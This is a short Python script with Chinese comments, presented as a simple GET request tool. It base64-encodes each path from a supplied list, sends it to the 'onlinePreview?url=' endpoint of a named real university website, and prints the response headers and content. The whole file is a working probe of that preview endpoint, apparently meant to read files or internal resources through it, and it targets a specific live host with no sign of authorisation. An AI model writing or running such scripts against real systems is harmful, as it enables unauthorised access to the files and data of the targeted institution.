import requests
import argparse
import base64


def send_get_request(url):
    """发送 GET 请求并返回响应结果"""
    try:
        # 发送 GET 请求，设置超时时间为 10 秒
        response = requests.get(url, timeout=10)
        # 检查响应状态码（200 表示成功）
        response.raise_for_status()
        return {
            "status_code": response.status_code,
            "headers": dict(response.headers),  # 转换为字典方便查看
            "content": response.text[:10000]  # 显示前 1000 个字符的内容
        }
    except requests.exceptions.RequestException as e:
        return {"error": f"请求失败：{str(e)}"}


def main():
    # 解析命令行参数
    parser = argparse.ArgumentParser(description="简单 GET 请求工具")
    parser.add_argument("-f", "--file", help="包含目录的文件路径")
    args = parser.parse_args()

    if not args.file:
        print("请提供包含目录的文件路径。")
        return

    base_url = "https://www.xcmc.edu.cn/views/onlinePreview?url="
    try:
        with open(args.file, 'r') as file:
            directories = file.read().splitlines()

        for directory in directories:
            # 对目录进行 Base64 编码
            encoded_directory = base64.b64encode(directory.encode('utf-8')).decode('utf-8')
            full_url = base_url + encoded_directory
            # 发送请求并获取结果
            result = send_get_request(full_url)

            # 输出结果
            print(f"URL: {full_url}")
            if "error" in result:
                print(f"错误：{result['error']}")
            else:
                print(f"状态码：{result['status_code']}")
                print(f"响应头（部分）：{dict(list(result['headers'].items())[:5])}  # 显示前 5 个头部信息")
                print(f"响应内容（前 1000 字符）：\n{result['content']}")
            print("-" * 50)
    except FileNotFoundError:
        print(f"文件 {args.file} 未找到。")


if __name__ == "__main__":
    main()
